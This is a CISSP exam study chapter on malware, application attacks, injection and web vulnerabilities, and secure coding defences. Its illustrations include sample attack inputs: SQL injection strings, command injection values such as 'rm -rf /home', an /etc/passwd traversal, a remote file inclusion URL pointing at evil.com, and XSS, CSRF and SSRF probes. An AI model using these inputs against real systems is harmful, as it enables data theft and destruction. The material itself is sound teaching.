# Chapter 21: Malicious Code and Application Attacks

- [Malware](#malware)
  - [Sources of Malicious Code]()
  - [Viruses]()
    - [Virus Propagation Techniques]()
    - [Virus Technologies]()
    - [Hoaxes]()
  - [Logic Bombs]()
  - [Trojan Horses]()
  - [Worms]()
    - [Code Red Worm]()
    - [Stuxnet]()
  - [Spyware and Adware](#spyware-and-adware)
  - [Ransomware](#ransomware)
  - [Malicious Scripts](#malicious-scripts)
  - [Zero-Day Attacks](#zero-day-attacks)
- [Malware Prevention](#malware-prevention)
  - [Platforms Vulnerable to Malware](#platforms-vulnerable-to-malware)
  - [Anti-malware Software](#anti-malware-software)
    - [Signature-Based Detection](#signature-based-detection)
    - [Heuristic Detection and Sandboxing](#heuristic-detection-and-sandboxing)
  - [Integrity Monitoring](#integrity-monitoring)
  - [Advanced Threat Protection](#advanced-threat-protection)
    - [Endpoint Detection and Response (EDR)](#endpoint-detection-and-response-edr)
    - [Managed Detection and Response (MDR)](#managed-detection-and-response-mdr)
    - [User and Entity Behavior Analytics (UEBA)](#user-and-entity-behavior-analytics-ueba)
- [Application Attacks](#application-attacks)
  - [Buffer Overflows](#buffer-overflows)
  - [Time of Check to Time of Use](#time-of-check-to-time-of-use)
  - [Backdoors](#backdoors)
  - [Privilege Escalation and Rootkits](#privilege-escalation-and-rootkits)
- [Injection Vulnerabilities](#injection-vulnerabilities)
  - [SQL Injection Attacks](#sql-injection-attacks)
    - [Classic SQL Injection](#classic-sql-injection)
    - [Blind Content-Based SQL Injection](#blind-content-based-sql-injection)
    - [Blind Timing-Based SQL Injection](#blind-timing-based-sql-injection)
  - [Code Injection Attacks](#code-injection-attacks)
    - [LDAP Injection](#ldap-injection)
    - [XML Injection](#xml-injection)
  - [Command Injection Attacks](#command-injection-attacks)
    - [DLL Injection](#dll-injection)
    - [HTML Injection](#html-injection)
- [Exploiting Authorization Vulnerabilities](#exploiting-authorization-vulnerabilities)
  - [Insecure Direct Object References](#insecure-direct-object-references)
  - [Directory Traversal](#directory-traversal)
  - [File Inclusion Attacks](#file-inclusion-attacks)
    - [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
    - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [Exploiting Web Application Vulnerabilities](#exploiting-web-application-vulnerabilities)
  - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
    - [Reflected XSS](#reflected-xss)
    - [Stored/Persistent XSS](#storedpersistent-xss)
    - [DOM-Based XSS](#dom-based-xss)
  - [Request Forgery](#request-forgery)
    - [Cross-Site Request Forgery (CSRF/XSRF)](#cross-site-request-forgery-csrfxsrf)
    - [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
  - [Session Hijacking](#session-hijacking)
- [Application Security Controls](#application-security-controls)
  - [Input Validation](#input-validation)
    - [Whitelisting and Blacklisting](#whitelisting-and-blacklisting)
    - [Client-Side vs Server-Side Validation](#client-side-vs-server-side-validation)
    - [Metacharacters](#metacharacters)
    - [Parameter Pollution](#parameter-pollution)
  - [Web Application Firewalls](#web-application-firewalls)
  - [Database Security]()
    - [Parameterized Queries and Stored Procedures]()
    - [Obfuscation and Camouflage]()
  - [Code Security]()
    - [Code Signing]()
    - [Code Reuse]()
    - [Software Diversity]()
    - [Code Repositories]()
    - [Integrity Measurement]()
    - [Application Resilience]()
- [Secure Coding Practices](#secure-coding-practices)
  - [Source Code Comments](#source-code-comments)
  - [Error Handling](#error-handling)
  - [Hard-Coded Credentials](#hard-coded-credentials)
  - [Memory Management](#memory-management)
    - [Resource Exhaustion](#resource-exhaustion)
    - [Pointer Dereferencing](#pointer-dereferencing)
- [Summary](#summary)


### Malware

#### Sources of Malicious Code
Malicious code (or "malware") can enter systems through multiple vectors:
- Infected software downloads from untrusted or compromised sources
- Malicious email attachments or embedded links in phishing emails
- USB drives and other removable media
- Websites hosting exploit kits or drive-by downloads
- Insider threats, either malicious or negligent

🛡️ **CISSP Exam Tip**: Be familiar with how different malware enters a system—phishing and removable media are highly tested entry points.

#### Viruses
A **virus** is a type of self-replicating malware that attaches itself to a host file or program and spreads **only when executed by a user**.

##### Virus Propagation Techniques
| Type                  | Description |
|-----------------------|-------------|
| File Infector         | Attaches to executable programs (e.g., .exe files) |
| Boot Sector Virus     | Infects the boot record on disks, activates on boot |
| Macro Virus           | Targets macros in applications like Microsoft Word |
| Multipartite Virus    | Uses multiple infection methods (e.g., file + boot sector) |

##### Virus Technologies
- **Stealth Virus**: Conceals itself by intercepting system requests.
- **Polymorphic Virus**: Changes its code signature with each replication.
- **Metamorphic Virus**: Rewrites its entire code base during propagation.

##### Hoaxes
- Social engineering tactics meant to deceive users into performing unsafe actions (e.g., deleting system files or installing fake antivirus software).

#### Logic Bombs
A **logic bomb** is a piece of malicious code inserted deliberately and activated under specific conditions (e.g., on a specific date or after a user action). Often used by insiders.

#### Trojan Horses
A **Trojan** is a program that appears to be useful or benign but hides malicious functions. Trojans **do not self-replicate**.
- Common payloads: keyloggers, backdoors, or ransomware droppers.

#### Worms
**Worms** are self-replicating programs that spread **without** user action, often exploiting network vulnerabilities.

##### Code Red Worm (2001)
- Exploited Microsoft IIS web server buffer overflow.
- Performed DoS attacks and website defacement.

##### Stuxnet
- Highly advanced worm targeting ICS and SCADA systems.
- Used multiple zero-day vulnerabilities.
- Physically sabotaged Iranian nuclear centrifuges.

#### Spyware and Adware
- **Spyware**: Collects sensitive data like credentials or browsing habits.
- **Adware**: Bombards users with ads; may track behavior to personalize spam.
- Both fall under **Potentially Unwanted Programs (PUPs)**.

⚠️ **Exam Note**: Spyware often violates privacy and is linked to data exfiltration.

#### Ransomware
A type of malware that encrypts files and demands payment to decrypt them.
- May also threaten to leak data ("double extortion").
- Common infection methods: phishing, RDP brute-force, software exploits.
- Legal/Ethical Issue: Payments may violate OFAC sanctions.

#### Malicious Scripts
Scripts written in languages like **PowerShell**, **Bash**, or **JavaScript** automate attacks.
- Used in APTs (Advanced Persistent Threats)
- Often support **fileless malware**, which runs in memory only.

#### Zero-Day Attacks
- Exploits for vulnerabilities **not yet publicly disclosed** or patched.
- Organizations are vulnerable during the **"window of vulnerability"**.

🧠 **Defense Strategy**:
- Timely patching
- EDR (Endpoint Detection & Response)
- Application control
- Content filtering

### Malware Prevention

#### Platforms Vulnerable to Malware
- **Microsoft Windows** remains the primary target of most malware (~83% as of 2020).
- **macOS** and **Android** platforms are increasingly targeted, with significant growth in malware attacks.
- **CISSP Exam Tip**: All operating systems are vulnerable. Platform diversity is not a silver bullet.

#### Anti-malware Software
Modern anti-malware tools detect, prevent, and remove malicious code from endpoints and servers.

##### Signature-Based Detection
- Matches known malware patterns (signatures) in a database.
- Requires **frequent updates** to be effective against emerging threats.
- Default actions:
  - **Disinfect** if possible
  - **Quarantine** if disinfection fails
  - **Delete** as last resort

##### Heuristic Detection and Sandboxing
- **Heuristic**: Identifies malware by analyzing behaviors (e.g., privilege escalation, system file modification).
- **Sandboxing**: Executes suspicious files in an isolated environment to monitor behavior safely.
- Helps detect **zero-day threats** and polymorphic malware.

🛡️ **Key Point**: Heuristic tools are essential for identifying unknown and advanced malware.

#### Integrity Monitoring
- Uses **hash functions** to detect unauthorized file changes.
- Alerts admins to unexpected changes in critical files (e.g., `cmd.exe`, `command.com`).
- Common in web server defacement detection.

🧪 Example: If a file’s stored hash ≠ current hash, the file has been altered.

#### Advanced Threat Protection
Comprehensive endpoint security that goes beyond traditional antivirus solutions.

##### Endpoint Detection and Response (EDR)
- Monitors memory, files, and network activity for malicious indicators.
- Automates isolation of compromised systems.
- Integrates with threat intelligence and incident response workflows.

##### Managed Detection and Response (MDR)
- A **managed security service** providing:
  - Threat detection
  - Alert analysis
  - Remediation support
- Ideal for organizations lacking 24/7 internal monitoring.

##### User and Entity Behavior Analytics (UEBA)
- Detects anomalies in user behavior (e.g., odd login times, excessive data access).
- Builds baselines for normal activity and flags deviations.
- Complements EDR (user-focused vs. endpoint-focused).

| Technology | Focus                        | Role in Defense             |
|-----------|-------------------------------|-----------------------------|
| EDR       | Endpoint monitoring           | Detection and response      |
| MDR       | Outsourced EDR + Response     | Managed security operations |
| UEBA      | User behavior monitoring      | Insider threat detection    |

🚨 **Exam Reminder**: Know the **difference** between EDR, MDR, and UEBA, and how they integrate into a layered security architecture.

### Application Attacks

#### Buffer Overflows
- A **buffer overflow** occurs when more data is written to a memory buffer than it can hold.
- Can lead to:
  - **Crashes**
  - **Memory corruption**
  - **Remote Code Execution (RCE)** by overwriting return addresses or function pointers
- Common in C/C++ where bounds checking is not enforced by the language.
- Mitigation strategies:
  - Input validation (length and type)
  - Compiler-level protections: Stack canaries, ASLR (Address Space Layout Randomization), DEP (Data Execution Prevention)
  - Use memory-safe languages (e.g., Java, Python)

📌 **Exam Tip**: Focus on how buffer overflows impact confidentiality, integrity, and availability (CIA), and what controls can mitigate them.

#### Time of Check to Time of Use
- A **race condition vulnerability** where an attacker changes the system state between a check and an action.
- Example:
  - Program checks access permission to a file.
  - Before using the file, the attacker replaces it with a symbolic link to a protected file (e.g., `/etc/passwd`).
- This allows **unauthorized access or modification**.

🛡️ **Mitigation**:
- Use atomic operations or secure APIs that combine check and use.
- Minimize time gaps between operations.

🔄 **CISSP Note**: TOCTTOU exploits system timing assumptions and violates secure design principles.

#### Backdoors
- **Backdoor**: Hidden method of bypassing authentication mechanisms.
- May be:
  - **Intentionally coded** by developers for debugging
  - **Injected** by attackers/malware post-compromise
- Risks:
  - Undocumented access
  - Difficult to detect with traditional logging or monitoring

🔐 **Best Practices**:
- Code reviews and change management
- Disable/remove debugging hooks before production
- Use threat detection tools that detect command-and-control traffic or unauthorized access attempts

⚠️ **Exam Insight**: Backdoors undermine security controls like access control, auditing, and non-repudiation.

#### Privilege Escalation and Rootkits

##### Privilege Escalation
- **Vertical Escalation**: Standard user gains admin/root-level privileges.
- **Horizontal Escalation**: User accesses resources of another user at the same privilege level.
- Techniques:
  - Exploiting unpatched vulnerabilities
  - Misconfigured permissions
  - Credential theft
  - DLL injection or exploitation of setuid/setgid programs

##### Rootkits
- A **rootkit** is software designed to conceal the presence of malware and maintain privileged access.
- Capabilities:
  - Hides files, processes, and registry entries
  - Disables security mechanisms
  - Operates at kernel or user level

🔒 **Detection and Prevention**:
- Secure boot & UEFI firmware protections
- Memory integrity tools (e.g., Windows HVCI)
- Kernel-mode code signing
- Integrity checking (e.g., Tripwire)

🧠 **CISSP Tip**: Privilege escalation is a stepping stone to long-term persistence, often coupled with rootkits. Know the distinction and layered defenses.

| Threat                     | Description                                       | Mitigation                          |
|---------------------------|---------------------------------------------------|-------------------------------------|
| Buffer Overflow           | Overruns buffer memory, leading to code exec     | Input validation, stack canaries    |
| TOCTTOU                   | Resource state changes between check and use     | Atomic operations                   |
| Backdoor                  | Hidden bypass to access controls                  | Code audits, secure coding          |
| Privilege Escalation      | Unauthorized elevation of user privileges         | Patch management, least privilege   |
| Rootkit                   | Stealthy control-maintaining malware              | Secure boot, integrity monitoring   |

### Injection Vulnerabilities

Injection vulnerabilities occur when untrusted input is improperly handled and interpreted as code or commands by a backend system. These flaws can impact databases, directories, operating systems, or application logic, resulting in data breaches, remote code execution, or privilege escalation.

#### SQL Injection Attacks
**SQL Injection (SQLi)** is a technique that allows attackers to manipulate SQL queries through user input fields. It is one of the most common and dangerous web application vulnerabilities.

##### Classic SQL Injection
- Occurs when input is directly included in SQL statements without proper validation or sanitization.
- Attackers can:
  - **Extract sensitive data**
  - **Modify or delete records**
  - **Execute administrative operations**
- Example:
  ```sql
  SELECT * FROM users WHERE username = '$input';
  ```
  If `$input` = `admin' OR '1'='1`, the query becomes:
  ```sql
  SELECT * FROM users WHERE username = 'admin' OR '1'='1';
  ```

🧠 **CISSP Tip**: Know how SQL injection breaks the **integrity** and **confidentiality** of databases.

##### Blind Content-Based SQL Injection
- The application doesn't return results directly, but behavior changes reveal whether a statement was executed.
- Example:
  - Input: `52019' AND 1=1;--` → returns valid results
  - Input: `52019' AND 1=2;--` → returns no result
- Attackers use this behavior to infer the structure or content of the database.

##### Blind Timing-Based SQL Injection
- Relies on **delays** introduced in SQL execution to detect injection vulnerabilities.
- Example:
  ```sql
  52019'; WAITFOR DELAY '00:00:10';--
  ```
  If the application delays its response, it's likely vulnerable.

🕒 **CISSP Insight**: Timing-based techniques help attackers when they can’t see direct output (e.g., error-suppressed apps).

#### Code Injection Attacks
Code injection is a broader category where attackers insert executable code into a program’s input stream.

- These attacks are not limited to SQL; they may involve directory services, XML parsers, shell commands, etc.

##### LDAP Injection
- Injects malicious queries into **Lightweight Directory Access Protocol (LDAP)** statements.
- Goal: Bypass authentication or extract unauthorized directory data.
- Example:
  ```ldap
  (&(uid=admin)(userPassword=*)) → expands search access.
  ```

##### XML Injection
- Occurs when attackers insert malicious XML content into requests to manipulate XML-based applications or services.
- Can be used to:
  - Alter structure of XML
  - Inject DTD (Document Type Definitions)
  - Perform **XXE (XML External Entity)** attacks

🛡️ **Mitigation for Injection Attacks**:
- Input validation and allowlists
- Parameterized queries (e.g., `PreparedStatement()` in Java)
- Use of ORM (Object-Relational Mapping) libraries
- Output encoding

#### Command Injection Attacks
Command injection allows attackers to execute arbitrary OS-level commands on a host running a vulnerable application.

- Targets applications that pass user input into system shell or interpreter commands.

- Example:
  - Input: `mchapple & rm -rf /home`
  - Command run: `mkdir /home/students/mchapple & rm -rf /home`

⚠️ **Danger**: Can result in full compromise of the operating system.

##### DLL Injection
- **Dynamic-Link Library (DLL) Injection**: In Windows, malicious DLLs are injected into the memory space of a legitimate process.
- The attacker forces a process to load a malicious DLL instead of a trusted one.
- Often used to **hook** functions and exfiltrate data.

##### HTML Injection
- Inserts HTML tags into application output, often leading to:
  - UI redress attacks
  - Web defacement
  - **Cross-site scripting (XSS)** if scripting tags are allowed

🎯 **CISSP Reminder**: Differentiate between **data injection (e.g., SQL/LDAP)** vs. **command injection (e.g., shell/DLL)**. Each targets different layers.

| Type of Injection | Target System        | Example Attack           | Mitigation                          |
|------------------|----------------------|--------------------------|-------------------------------------|
| SQL Injection     | Database (e.g., MySQL) | `OR 1=1--`                | Parameterized queries, input validation |
| LDAP Injection    | Directory Services   | `*)(uid=*))(|(uid=*`     | Input sanitization, escaping special chars |
| XML Injection     | XML parsers, APIs    | `<tag><evil></tag>`      | XML schema validation, disabling DTDs |
| Command Injection | OS shell             | `; rm -rf /`             | Use secure APIs, input validation   |
| DLL Injection     | Windows processes    | Load malicious DLL       | DLL signing, whitelist paths        |
| HTML Injection    | Web frontend         | `<b>Hacked!</b>`         | Output encoding, HTML sanitization  |

### Exploiting Authorization Vulnerabilities

Authorization vulnerabilities allow attackers to bypass or exploit weak access control mechanisms, gaining access to data or resources beyond their intended permissions. These flaws violate the **principle of least privilege** and can result in significant breaches.

#### OWASP
- The **Open Worldwide Application Security Project (OWASP)** is a nonprofit organization focused on improving software security.
- Maintains:
  - **OWASP Top 10**: Critical web application risks  
    👉 https://owasp.org/www-project-top-ten/
  - **OWASP Proactive Controls**: Security practices for developers  
    👉 https://owasp.org/www-project-proactive-controls/

🧠 **CISSP Insight**: Know that OWASP provides standards and tools for secure application development, testing, and education.

#### Insecure Direct Object References
- Occurs when applications expose internal object references (e.g., document IDs, account numbers) without enforcing proper authorization checks.
- Example:
  ```
  https://example.com/getDocument.php?documentID=123
  ```
  Changing the ID to another value may allow unauthorized access:
  ```
  https://example.com/getDocument.php?documentID=124
  ```

- Real-World Case: A Canadian teen was charged in 2018 after discovering IDOR in Nova Scotia’s Freedom of Information website by modifying URLs.

🚨 **Key Concept**: IDOR is a **Broken Access Control** issue in the OWASP Top 10. Ensure server-side authorization checks!

#### Directory Traversal
- Attacker navigates beyond the root web directory to access unauthorized files using path traversal sequences like `../`.
- Example:
  ```
  http://example.com/view?file=../../etc/passwd
  ```

- This attack abuses:
  - Inadequate input sanitization
  - Lack of file access restrictions

🛡️ **Mitigation**:
- Normalize paths and restrict input
- Implement access controls at file system and app level

#### File Inclusion Attacks
- Attackers inject file paths into vulnerable applications to **load and execute files**.
- Two types:
  
##### Local File Inclusion (LFI)
- Executes files already on the server.
- Example:
  ```
  http://example.com/page.php?file=../../uploads/attack.php
  ```

##### Remote File Inclusion (RFI)
- Executes attacker-controlled remote code.
- Example:
  ```
  http://example.com/page.php?file=http://evil.com/malware.php
  ```

- Often used to install **web shells** for persistent access.

🔐 **Best Practices**:
- Disable `allow_url_include` in PHP
- Use strict allowlists for file paths
- Sanitize input parameters

| Vulnerability         | Description                                              | Mitigation                           |
|----------------------|----------------------------------------------------------|--------------------------------------|
| IDOR                 | Access to objects (e.g., documents) without authorization | Enforce server-side access control   |
| Directory Traversal  | Access files using `../` to escape web root               | Input validation, file path filters  |
| LFI                  | Execute local server files                                | Input sanitization, restrict file inclusion |
| RFI                  | Execute remote attacker-controlled files                  | Disable remote includes, validate URLs |

🧠 **CISSP Reminder**: Always apply **authorization checks** even when access appears to be indirect or URL-based.

### Exploiting Web Application Vulnerabilities

Web applications are often exposed to the internet and process sensitive user input, making them prime targets for exploitation. The following vulnerabilities are critical components of the **OWASP Top 10** and CISSP exam content.

#### Cross-Site Scripting (XSS)
Cross-site scripting (XSS) occurs when an attacker injects **malicious scripts** into content that is then delivered to another user’s browser.

##### Reflected XSS
- Malicious script is reflected off a web server, usually via URL.
- Executed immediately in the browser.
- Often used in phishing attacks.
- Example:
  ```
  http://example.com/search?query=<script>alert('XSS')</script>
  ```

##### Stored/Persistent XSS
- Malicious script is stored on the server (e.g., in a comment or message board).
- Triggered whenever a victim loads the infected page.
- More dangerous due to broader exposure.

##### DOM-Based XSS
- The vulnerability lies in the **client-side JavaScript** rather than the server.
- The DOM is modified based on untrusted data without proper sanitization.

🛡️ **Prevention**:
- Input validation (whitelisting preferred)
- Output encoding (HTML, JavaScript, URL)
- HTTP-only and Secure cookie flags

📌 **Exam Tip**: Know the difference between reflected, stored, and DOM-based XSS.

### Request Forgery
#### Cross-Site Request Forgery (CSRF/XSRF)
Tricks an authenticated user's browser into sending **unauthorized requests** to a trusted site.

- Exploits the **trust a site has in the user**.
- Often embedded in an image or iframe.
- Example:
  ```html
  <img src="https://bank.com/transfer?amount=1000&to=attacker" />
  ```

🛡️ **Mitigation**:
- Use **anti-CSRF tokens**
- Validate HTTP referers
- Require re-authentication for critical actions

🧠 **CISSP Note**: CSRF != XSS. CSRF targets **server-side trust** in client; XSS targets **client-side execution** of injected code.

#### Server-Side Request Forgery (SSRF)
- Application **accepts a URL from the user** and then **makes a request** to that URL.
- Attackers can access internal systems by supplying internal URLs.
- Example:
  ```
  http://app.com/fetch?url=http://localhost:8080/admin
  ```

🛡️ **Mitigation**:
- Disallow user-supplied URLs for internal requests
- Use allowlists for permitted URLs

#### Session Hijacking
Takes control of a valid user session to impersonate a legitimate user.

- Techniques:
  - Stealing session cookies
  - Predictable session IDs
  - Man-in-the-middle (MitM) attacks

🛡️ **Prevention**:
- Regenerate session IDs upon login
- Use HTTPS with HSTS
- Set cookies with:
  - `Secure` (HTTPS only)
  - `HttpOnly` (not accessible via JavaScript)
  - `SameSite` (limit cross-origin use)

| Vulnerability | Exploits               | Protection Strategy                        |
|---------------|------------------------|---------------------------------------------|
| XSS           | Trust of user in site  | Input validation, output encoding           |
| CSRF          | Trust of site in user  | Anti-CSRF tokens, re-authentication         |
| SSRF          | Server fetching user input | Whitelisting, disable internal URL access |
| Session Hijacking | Session management flaws | Secure cookie flags, HTTPS, ID rotation  |

🚨 **CISSP Insight**: Understand **trust relationships** and how attacks manipulate them.

### Application Security Controls

Application security controls combine secure coding practices with infrastructure-based protections to build **defense-in-depth** against vulnerabilities.

#### Input Validation
The **most critical** control in application security.

- Prevents attacks like:
  - SQL injection
  - Cross-site scripting (XSS)
  - Buffer overflows

##### Whitelisting and Blacklisting
✅ **Best Practice: Whitelisting (Allow listing)**  
- Only allow expected formats/types (e.g., age = integer 0–123)
- Server-side validation is mandatory

⚠️ **Blacklist (Block listing)**  
- Blocking known bad characters (e.g., `<`, `'`, `--`)
- Less effective due to bypass techniques

##### Client-Side vs Server-Side Validation
🧠 **CISSP Tip**: Validation must happen on the **server side**, not just the client side (e.g., JavaScript), as attackers can bypass browsers.

##### Metacharacters
- **Metacharacters** have special meanings in queries/scripts (e.g., `;`, `|`, `'`, `--`)
- **Escaping** neutralizes these characters
  - Example: `\` or encoding (`%27` for `'`)

##### Parameter Pollution
- Multiple values are submitted for the same input parameter
- Web apps may validate one and execute the other

🛡️ **Defense**:
- Enforce strict server-side parameter validation
- Apply secure input parsing libraries

#### Web Application Firewalls
- Work at the **Application Layer (OSI Layer 7)**
- Monitor, filter, or block HTTP traffic to/from web applications

✅ Uses:
- Blocks SQL injection/XSS attempts
- Enforces input/output rules
- Supplements insecure legacy applications

📌 **CISSP Note**: WAFs are compensating controls — don’t replace secure coding.

#### Database Security

##### Parameterized Queries
- Uses **query templates** with placeholders
- Prevents attacker input from becoming executable SQL

Example (Java):
```java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, 101);
```

##### Stored Procedures
- SQL logic stored and executed on the DB server
- Accepts user input as parameters
- Isolated from raw SQL construction

🧠 **CISSP Insight**: Both stored procedures and parameterized queries protect against SQLi.

#### Obfuscation and Camouflage

| Technique     | Description                                           | Goal                        |
|---------------|-------------------------------------------------------|-----------------------------|
| Data Minimization | Don’t collect/store unnecessary sensitive data      | Reduce attack surface       |
| Tokenization  | Replace data with lookup token + secure mapping table | Data protection             |
| Hashing + Salt | Irreversible ID transformation + salt for uniqueness  | Defend against rainbow attacks |

🔐 Example: Store `SHA256(salt + SSN)` instead of plain SSN.

#### Code Security

##### Code Signing
- Confirms code authorship and integrity via digital signatures
- Does **not** mean the code is safe — just unmodified

🧠 **CISSP Tip**: Code signing uses **asymmetric encryption** (private sign, public verify).

##### Code Reuse and SDKs
- Risks:
  - Inherited vulnerabilities from libraries
  - License issues
- Security teams must **track dependencies** and monitor for updates

##### Software Diversity
- Avoid **single points of failure**
- Use different compilers, libraries, or code bases when possible

#### Code Repositories
- Centralized code storage and versioning
- Support:
  - Access control
  - Change logging
  - Rollback and auditing
- Help avoid “dead code” and promote reuse

#### Integrity Measurement
- Uses **cryptographic hashes** to confirm code hasn’t been altered
- Validates against approved release versions

### Application Resilience

| Concept    | Definition                                                    | Goal                         |
|------------|---------------------------------------------------------------|------------------------------|
| Scalability | Can add more resources to meet demand (scale up/out)         | Support growth               |
| Elasticity | Can scale both **up and down** automatically                   | Optimize cost and resources |

🚀 Common in cloud-native apps with autoscaling capabilities.

📌 **CISSP Reminder**: Resilient apps resist failure and adapt to change. Think scalability + elasticity + availability.

### Secure Coding Practices

Secure coding ensures that the application is robust, resilient, and less susceptible to exploitation. CISSP emphasizes both proactive and defensive development techniques.

#### Source Code Comments
- Developers often leave **comments** to document functionality.
- Comments should be:
  - Removed from **production code** (especially web apps)
  - Retained in **archived source code** only

🚨 **Security Risk**: Comments may reveal internal logic, file paths, or hidden API keys.

#### Error Handling
- Poor error handling may:
  - Crash apps (DoS risk)
  - Leak sensitive system details (e.g., stack trace, DB schema)
- Use **try…catch** logic to gracefully manage failures

Example in Java:
```java
try {
  int result = divide(x, y);
} catch (ArithmeticException e) {
  log.error("Division error occurred");
}
```

✅ Best Practices:
- Log internal details for admins only
- Show **generic messages** to users (e.g., "An error occurred. Please try again.")

#### Hard-Coded Credentials
- Including passwords/API keys in source code is a **critical security flaw**.

🛑 Risks:
- Exposing credentials through GitHub/public repositories
- Providing attackers persistent access

🔒 **CISSP Guidance**:
- Store secrets in **secure vaults** or encrypted configs
- Enforce secrets scanning before commit

#### Memory Management

##### Resource Exhaustion
- Excessive memory/CPU/disk usage causes Denial of Service (DoS)
- Example: **Memory leak** – program allocates memory but never releases it

✅ Use:
- Garbage collection
- Resource quotas/limits
- Regular testing under load

##### Pointer Dereferencing
- Common in low-level languages like C/C++
- A **null pointer** dereference can crash apps or expose system data

🧠 **CISSP Insight**:
- Validate pointers before use
- Use memory-safe languages (e.g., Rust, Java) where possible

#### Summary of Secure Coding Threats and Defenses

| Issue                  | Risk                              | Mitigation Strategy                           |
|------------------------|-----------------------------------|-----------------------------------------------|
| Comments in Source     | Reveals code internals            | Strip from production builds                  |
| Poor Error Handling    | Information leakage / crashes     | Use try…catch, log safely                     |
| Hard-coded Credentials | Persistent compromise risk        | Secure secrets management                     |
| Memory Leaks           | DoS via resource exhaustion       | Memory cleanup, resource quotas               |
| Null Pointer Deref.    | Application crash or hijack       | Validate pointers, use modern languages       |

🔐 **CISSP Exam Reminder**: Secure coding is a proactive control. It reduces vulnerabilities **before** the application is deployed.

### Summary

Malicious actors continuously evolve their tools and methods to exploit vulnerabilities in applications, systems, and users. Chapter 21 emphasizes that a multi-layered defense approach is essential to withstand modern threats. Below is a consolidated recap of critical concepts and best practices:

#### 🦠 Malware Threats
- **Types**: Viruses, worms, Trojan horses, logic bombs, spyware, adware, ransomware, rootkits, and fileless malware.
- **Vectors**: Email attachments, websites, removable media, and vulnerable applications.
- **Notable Threats**: Stuxnet (industrial sabotage), Code Red (mass scanning worm), and modern ransomware (cryptographic extortion).

#### 🔒 Malware Prevention
- Use up-to-date **anti-malware** with:
  - Signature-based detection for known threats
  - Heuristics and sandboxing for unknown threats
- Employ **file integrity monitoring**, **EDR**, **UEBA**, and **MDR** for advanced defense
- Secure all platforms, including Windows, macOS, Linux, and mobile OS

#### ⚔️ Application Attacks
- Common vectors:
  - **Buffer overflows** (memory corruption)
  - **TOCTTOU** (race conditions)
  - **Backdoors** (undocumented access)
  - **Privilege escalation** (user → admin)
  - **Rootkits** (stealth persistence)

#### 💉 Injection Vulnerabilities
- **SQL injection** and its forms: classic, blind (content-based and timing-based)
- **Code injection** targeting LDAP, XML, HTML, and DLL libraries
- **Command injection** leading to OS-level command execution

#### 🛡️ Secure Coding Practices
- Follow **defense-in-depth** by layering controls:
  - Input validation (whitelisting > blacklisting)
  - Safe memory management
  - Error handling without exposing internals
  - Avoid hardcoded credentials
- Protect code using:
  - Secure source control (e.g., Git with access control)
  - Code signing and integrity validation
  - Static and dynamic analysis

#### 🚨 CISSP Takeaways
- Malware and application security are closely intertwined.
- Secure software design reduces vulnerabilities before deployment.
- Always follow **secure coding standards** (e.g., OWASP, CERT, SEI).
- The best defense is **prevention**, supported by detection and rapid response.

🧠 **Final Tip for Exam**: Be able to map **threat types → attack vectors → mitigation strategies**. Expect questions testing your understanding of exploit mechanics and corresponding defense-in-depth controls.
